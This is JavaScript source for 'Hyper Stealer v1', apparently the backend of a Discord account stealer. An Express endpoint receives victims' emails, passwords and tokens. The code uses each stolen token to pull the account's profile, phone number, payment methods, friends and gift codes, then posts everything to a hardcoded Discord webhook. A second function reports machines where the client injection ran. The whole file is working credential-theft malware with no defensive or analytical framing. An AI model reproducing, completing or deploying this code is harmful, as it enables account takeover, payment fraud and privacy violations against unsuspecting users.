/*
   Hyper Stealer v1 | Made With Code Not With <3 xD
   Website : hyperstealer.lol
*/


let WEBHOOK_URL = "https://discord.com/api/webhooks/979653273617317938/HyXQZvMLqN7xp64_0kHXuk7ZKrOK2nc4Pm2OhtNTObMX68gYTRMWNCvChQgdUq0wHOK_";
let rawurl = "https://api.hyperstealer.vip";
let config = {
    "embed-color": 3158071
}

const express = require("express")
const axios = require("axios")


function GetNitro(flags) {
  if (flags == 0) {
      return "No Nitro"
  }
  if (flags == 1) {
      return "<:classic:896119171019067423> \`Nitro Classic\`"
  }
  if (flags == 2) {
      return "<a:boost:824036778570416129> \`Nitro Boost\`"
  } else {
      return "\`No Nitro\`"
  }
}


function GetRBadges(flags) {
  const Discord_Employee = 1;
  const Partnered_Server_Owner = 2;
  const HypeSquad_Events = 4;
  const Bug_Hunter_Level_1 = 8;
  const Early_Supporter = 512;
  const Bug_Hunter_Level_2 = 16384;
  const Early_Verified_Bot_Developer = 131072;
  var badges = "";
  if ((flags & Discord_Employee) == Discord_Employee) {
      badges += "<:staff:874750808728666152> "
  }
  if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
      badges += "<:partner:874750808678354964> "
  }
  if ((flags & HypeSquad_Events) == HypeSquad_Events) {
      badges += "<:hypesquad_events:874750808594477056> "
  }
  if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
      badges += "<:bughunter_1:874750808426692658> "
  }
  if ((flags & Early_Supporter) == Early_Supporter) {
      badges += "<:early_supporter:874750808414113823> "
  }
  if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
      badges += "<:bughunter_2:874750808430874664> "
  }
  if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
      badges += "<:developer:874750808472825986> "
  }
  if (badges == "") {
      badges = ""
  }
  return badges
}

function totalFriends(f) {
  const r = f.filter((user) => {

      return user.type == 1
  })
  return r.length
}

function CalcFriends(f) {
  const r = f.filter((user) => {
      return user.type == 1
  })
  var gay = "";
  for (z of r) {
      var b = GetRBadges(z.user.public_flags)
      if (b != "") {
          gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
      }
  }
  if (gay == "") {
      gay = "\`No Rare Friends\`"
  }
  return gay
}

function GetBadges(flags) {
  const Discord_Employee = 1;
  const Partnered_Server_Owner = 2;
  const HypeSquad_Events = 4;
  const Bug_Hunter_Level_1 = 8;
  const House_Bravery = 64;
  const House_Brilliance = 128;
  const House_Balance = 256;
  const Early_Supporter = 512;
  const Bug_Hunter_Level_2 = 16384;
  const Early_Verified_Bot_Developer = 131072;
  var badges = "";
  if ((flags & Discord_Employee) == Discord_Employee) {
      badges += "<:staff:874750808728666152> "
  }
  if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
      badges += "<:partner:874750808678354964> "
  }
  if ((flags & HypeSquad_Events) == HypeSquad_Events) {
      badges += "<:hypesquad_events:874750808594477056> "
  }
  if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
      badges += "<:bughunter_1:874750808426692658> "
  }
  if ((flags & House_Bravery) == House_Bravery) {
      badges += "<:bravery:874750808388952075> "
  }
  if ((flags & House_Brilliance) == House_Brilliance) {
      badges += "<:brilliance:874750808338608199> "
  }
  if ((flags & House_Balance) == House_Balance) {
      badges += "<:balance:874750808267292683> "
  }
  if ((flags & Early_Supporter) == Early_Supporter) {
      badges += "<:early_supporter:874750808414113823> "
  }
  if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
      badges += "<:bughunter_2:874750808430874664> "
  }
  if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
      badges += "<:developer:874750808472825986> "
  }
  if (badges == "") {
      badges = "\`None\`"
  }
  return badges
}

function Cool(card) {
  const json = card
  var billing = "";
  json.forEach(z => {
      if (z.type == "") {
          return "\`❌\`"
      } else if (z.type == 2 && z.invalid != !0) {
          billing += "\`✔️\`" + " <:paypal:896441236062347374>"
      } else if (z.type == 1 && z.invalid != !0) {
          billing += "\`✔️\`" + " :credit_card:"
      } else {
          return "\`❌\`"
      }
  })
  if (billing == "") {
      billing = "\`❌ No Payment Method\`"
  }
  return billing
}



function userLogin(password, email, token) {
    headers = { "Authorization": token }
    axios("https://discordapp.com/api/v9/users/@me", { headers: headers }).then(results=> {
        axios("https://discordapp.com/api/v6/users/@me/billing/payment-sources", { headers: headers }).then(card => {
            axios("https://discord.com/api/v9/users/@me/relationships", { headers: headers }).then(friends => {
              
            
            let fields = [ { "name": ":shield: Username", "value": `\`${results.data.username}#${results.data.discriminator}\``, "inline": true }, { "name": ":tools: Developer ID", "value": `\`${results.data.id}\``, "inline": true }, { "name": ":e_mail: Email", "value": `\`${email}\``, "inline": true }, { "name": ":white_check_mark: Verified", "value": `\`${results.data.verified}\``, "inline": true },{ "name": ":lock: Password", "value": `\`${password}\``, "inline": true} ]
            if (results.data.verified === true) {
                fields.push( { "name": ":mobile_phone: Phone", "value": `\`${results.data.phone}\``, "inline": true } )
            }
            fields.push({ "name": "<:st_nitro:956151524306874399> Subscription", "value": `${GetNitro(results.data.premium_type)}`, "inline": true })
            fields.push({ "name": "Payment Method", "value": `${Cool(card.data)}`, "inline": true })
            fields.push({ "name": "<a:aD_discordbadgesnitroall:943351577866018837> Badges", "value": `${GetBadges(results.data.flag)}`, "inline": true })
            fields.push({ "name": "Token", "value": `\`\`\`${token}\`\`\``, "inline": true })
            
            let fieldss = []
            axios.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', { headers: headers }).then(res => {
            res.data.forEach(json => {
            let description = `${json.code}`
            fieldss.push({ "name": `<:GIFT:937363744244240444> ${json.promotion.outbound_title}`, "value": `\`\`\`\n${description}\n\`\`\``, "inline": false })
            })
    
            let embed1 = { "description": `[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](${rawurl}/api?raw=${token}:${password})`, "color": config["embed-color"], "author": { "name": "HyperStealer | v1" }, "fields": fields, "footer": { "text": `hyperstealer.vip`, "icon": `https://cdn.discordapp.com/avatars/${results.data.id}/${results.data.avatar}` } }
            let embed2 = { "color": config["embed-color"], "title": `Total Frens (${totalFriends(friends.data)})`, "description": `${CalcFriends(friends.data)}`, "footer": { "text": `${results.data.username}#${results.data.discriminator}`, "icon": `https://cdn.discordapp.com/avatars/${results.data.id}/${results.data.avatar}` } }
            let embed3 = { "color": config["embed-color"], "title": `Gift Codes`, "fields": fieldss, "footer": { "text": `${results.data.username}#${results.data.discriminator}`, "icon": `https://cdn.discordapp.com/avatars/${results.data.id}/${results.data.avatar}` } }

            axios.post(WEBHOOK_URL, {"content": "||@here|| `New User Just Logged In`", "embeds": [ embed1, embed2, embed3 ] })
          })
        })
      })
    })
}


function UserInjected(path, hostname) {
    let embed = { "title": "Discord Initalized (User not Logged in)", "color": config["embed-color"],"fields": [{ "name": "Info", "value": `\`\`\`\nHost Name : ${hostname}\nPath Injected : ${path}\n\`\`\`` }],"footer": { "text": "VoidStealer | CaptchaCord.cc" } }
    axios.post(WEBHOOK_URL, {"content": "||@here|| `Injected But No Discords Logged In xD!!!`", "embeds": [ embed ] })
}


/*
   Rest Api Starts From Here xD Once Again Made With Code Not With <3
*/


const app = express()


app.get('/api/v1/userlogin', (req, res) => { 
    let password = req.query.password
    let email = req.query.email
    let token = req.query.token

    userLogin(password, email, token)
})

app.get('/api', (req, res) => {
    res.send(req.query.raw)
})

app.listen(6969)

console.log('                                 ______            __       __          ______               __')
console.log('                                / ____/___ _____  / /______/ /_  ____ _/ ____/___  _________/ /')
console.log('                               / /   / __ `/ __ \\/ __/ ___/ __ \\/ __ `/ /   / __ \\/ ___/ __  /')
console.log('                              / /___/ /_/ / /_/ / /_/ /__/ / / / /_/ / /___/ /_/ / /  / /_/ / ')
console.log('                              \\____/\\__,_/ .___/\\__/\\___/_/ /_/\\__,_/\\____/\\____/_/   \\__,_/ ')
console.log('                                        /_/')

console.log(`
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
* Debugger is active!
* Running on all addresses.
* WARNING: This is a development server. Do not use it in a production deployment.
* Running on http://localhost:6969/ (Press CTRL+C to quit)
`)


process.on('unhandledRejection', (error) => { console.log(`${error.stack}`) });
process.on("uncaughtException", (err, origin) => { console.log(`${err.stack}`) })
process.on('uncaughtExceptionMonitor', (err, origin) => { console.log(`${err.stack}`) });
process.on('beforeExit', (code) => { console.log(`${code}`) });
process.on('exit', (code) => { console.log(`${code}`) });
process.on('multipleResolves', (type, promise, reason) => { }); 